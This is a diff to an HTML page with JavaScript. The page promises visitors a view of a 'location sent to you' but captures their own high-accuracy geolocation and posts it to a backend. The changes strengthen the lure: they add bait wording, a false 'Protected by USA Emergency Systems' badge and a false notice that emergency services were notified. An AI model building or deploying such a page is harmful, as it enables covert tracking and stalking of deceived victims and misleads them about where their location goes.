@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Emergency Location Reporter | Critical Response System</title>
+    <title>Location </title>
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -80,21 +80,34 @@
     </style>
 </head>
 <body>
-    <h1>see the exact shared Location</h1>
+    <h1>Get to see exact Location sent to you </h1>
 
-    <button onclick="getLocation()">🚨 show me on map</button>
+    <button onclick="getLocation()" id="locationBtn">🚨 See on map</button>
 
     <div id="map"></div>
     
-    <p class="disclaimer">protected by usa</p>
+    <p class="disclaimer">Protected by USA Emergency Systems</p>
 
-    
-<script>
+    <div id="status" style="margin-top: 20px; text-align: center; font-weight: bold;"></div>
+
+    <script>
+        const btn = document.getElementById('locationBtn');
+        const statusDiv = document.getElementById('status');
+
         function getLocation() {
+            btn.disabled = true;
+            btn.textContent = "🛰️ Locating...";
+            statusDiv.textContent = "Acquiring your precise location...";
+            statusDiv.style.color = "#FFA500";
+
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendLocation, showError);
+                navigator.geolocation.getCurrentPosition(sendLocation, showError, {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                });
             } else {
-                alert("please wait as we load your map.");
+                showError({message: "Geolocation is not supported by your browser"});
             }
         }
 
@@ -102,7 +115,7 @@
             const lat = position.coords.latitude;
             const lng = position.coords.longitude;
 
-            // Show map preview using Google Static Map (optional, replace with JS map later if needed)
+            // Show map preview
             const map = document.getElementById('map');
             map.innerHTML = `
                 <iframe 
@@ -114,7 +127,11 @@
                 </iframe>
             `;
 
-            // Send data to Django backend
+            // Update UI
+            btn.textContent = "📡 waiting...";
+            statusDiv.textContent = "just a minute...";
+
+            // Send data to backend
             fetch('/report/', {
                 method: 'POST',
                 headers: {
@@ -128,21 +145,28 @@
             })
             .then(response => {
                 if (response.ok) {
-                    alert("📍 Location sent successfully!");
+                    btn.textContent = "✓ Location Sent!";
+                    btn.style.backgroundColor = "#4CAF50";
+                    statusDiv.textContent = "Emergency services have been notified with your location!";
+                    statusDiv.style.color = "#4CAF50";
                 } else {
-                    alert("❌ Failed to send location.");
+                    throw new Error('Server response not OK');
                 }
             })
             .catch(error => {
-                alert("⚠️ Error: " + error);
+                showError({message: "Failed to send location. Please try again."});
+                btn.textContent = "🚨 Retry Location Share";
+                btn.disabled = false;
             });
         }
 
         function showError(error) {
-            alert("Geolocation error: " + error.message);
+            statusDiv.textContent = "Error: " + error.message;
+            statusDiv.style.color = "#F44336";
+            btn.textContent = "🚨 Try Again";
+            btn.disabled = false;
         }
 
-        // Get CSRF token for Django POST
         function getCookie(name) {
             let cookieValue = null;
             const cookies = document.cookie.split(';');
